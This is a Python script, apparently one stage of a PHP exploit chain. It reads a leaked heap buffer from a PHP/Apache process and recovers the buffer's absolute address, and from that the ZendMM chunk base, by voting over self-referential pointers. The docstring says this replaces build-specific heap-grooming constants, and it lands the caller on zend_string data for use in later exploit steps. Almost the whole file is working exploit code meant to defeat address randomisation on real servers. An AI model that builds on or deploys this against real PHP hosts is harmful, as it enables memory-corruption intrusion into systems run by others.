#!/usr/bin/env python3
# INDEX: recover carrier buffer base from self-pointers | all | needs self-referential carrier buffer
"""Self-referential carrier-base recovery (P-K vote).

Capability: given a disclosed carrier buffer that contains pointers back into
itself (the multipart parse-state chain whose 0x40-stride words each point
0x40 ahead of themselves), recover the buffer's absolute base with no hardcoded
chunk-relative constant. A stored word at byte offset K holding V == base + T
implies base == V - K for the matching K. For each qword P in [ptr_lo, ptr_hi)
and each byte index K, form candidate base = P - K and keep only PAGE-ALIGNED
candidates: every genuine self-reference votes for the one true base, noise
scatters. The most-voted base, once it clears a quorum, is the buffer base.

base & ~0x1FFFFF gives the 2 MiB ZendMM chunk; base - chunk reproduces the
carrier's chunk-relative PAGE geometry (a_off == 0x69000 on 8.4.26-apache),
de-hardcoding that per-build groom constant. The recovered base is PAGE-ALIGNED
by construction; htdata_off == 0x690d8 == a_off(0x69000) + 0xd8, where 0xd8 is
the fixed zend_string-data sub-page offset (a PHP-ABI constant), so the caller
adds +0xd8 to land on the string data.

Pure stdlib, python3 -I safe.
"""

import struct
import sys
from collections import Counter

# Userspace heap-pointer window. Leaks sit at ~0x7xxxxxxxxxxx; overridable for
# other profiles.
PTR_LO = 0x700000000000
PTR_HI = 0x800000000000
PAGE = 0x1000
CHUNK_MASK = 0x1FFFFF   # 2 MiB ZendMM chunk mask


def self_locate(raw, min_votes=8, ptr_lo=PTR_LO, ptr_hi=PTR_HI):
    """Recover the absolute base of the disclosed carrier buffer `raw` from the
    self-referential pointers inside it.

    Scans every 8-aligned qword; for each value P in [ptr_lo, ptr_hi) and each
    byte index K in the buffer, forms candidate base = P - K and keeps it only
    when page-aligned. Returns (base, votes) for the most-voted base, or
    (None, votes) when the winner does not reach min_votes.
    """
    n = len(raw)
    if n < 16:
        return None, 0
    # All candidate target offsets K share the winner's page phase, so for each
    # pointer only the K with K % PAGE == P % PAGE can ever be page-aligned.
    # We still enumerate the full K grid, but short-circuit the non-aligned K
    # (P - K page-aligned <=> K ≡ P (mod PAGE)).
    votes = Counter()
    for o in range(0, n - 7, 8):
        p = struct.unpack_from("<Q", raw, o)[0]
        if not (ptr_lo <= p < ptr_hi):
            continue
        phase = p & (PAGE - 1)
        # K runs over buffer byte indices with the matching page phase; base =
        # P - K is then page-aligned by construction.
        for k in range(phase, n, PAGE):
            votes[p - k] += 1
    if not votes:
        return None, 0
    base, v = votes.most_common(1)[0]
    if v < min_votes:
        return None, v
    return base, v


def chunk_base(base):
    """2 MiB ZendMM chunk base of an absolute address (addr & ~0x1FFFFF)."""
    return base & ~CHUNK_MASK


def _read_blob(path):
    if path in (None, "-"):
        data = sys.stdin.buffer.read()
    else:
        with open(path, "rb") as f:
            data = f.read()
    # Accept a hex dump (whitespace/0x tolerated) or raw bytes.
    stripped = data.strip()
    hexset = b"0123456789abcdefABCDEF \t\r\n:x"
    if stripped and all(c in hexset for c in stripped):
        t = bytes(c for c in stripped if c not in b" \t\r\n:")
        t = t.replace(b"0x", b"").replace(b"0X", b"")
        try:
            return bytes.fromhex(t.decode("ascii"))
        except ValueError:
            pass
    return data


def main(argv):
    import argparse
    ap = argparse.ArgumentParser(
        description="Recover a leaked carrier buffer's absolute base from its "
                    "self-referential pointers (P-K vote).")
    ap.add_argument("blob", nargs="?", default="-",
                    help="leak blob file (raw bytes or hex); default stdin")
    ap.add_argument("--min-votes", type=int, default=8,
                    help="quorum to accept a base (default 8)")
    ap.add_argument("--ptr-lo", type=lambda s: int(s, 0), default=PTR_LO)
    ap.add_argument("--ptr-hi", type=lambda s: int(s, 0), default=PTR_HI)
    a = ap.parse_args(argv)

    raw = _read_blob(a.blob)
    base, votes = self_locate(raw, a.min_votes, a.ptr_lo, a.ptr_hi)
    print(f"[self_locate] blob: {len(raw)} bytes")
    if base is None:
        print(f"[self_locate] NO base reached quorum (best {votes} < "
              f"{a.min_votes} votes)")
        return 1
    cb = chunk_base(base)
    print(f"[self_locate] carrier page base = {base:#x}  ({votes} votes)")
    print(f"[self_locate] 2 MiB chunk       = {cb:#x}")
    print(f"[self_locate] chunk-rel page off = {base - cb:#x}  "
          f"(de-hardcoded a_off; htdata_off = this + fixed zend_string +0xd8)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
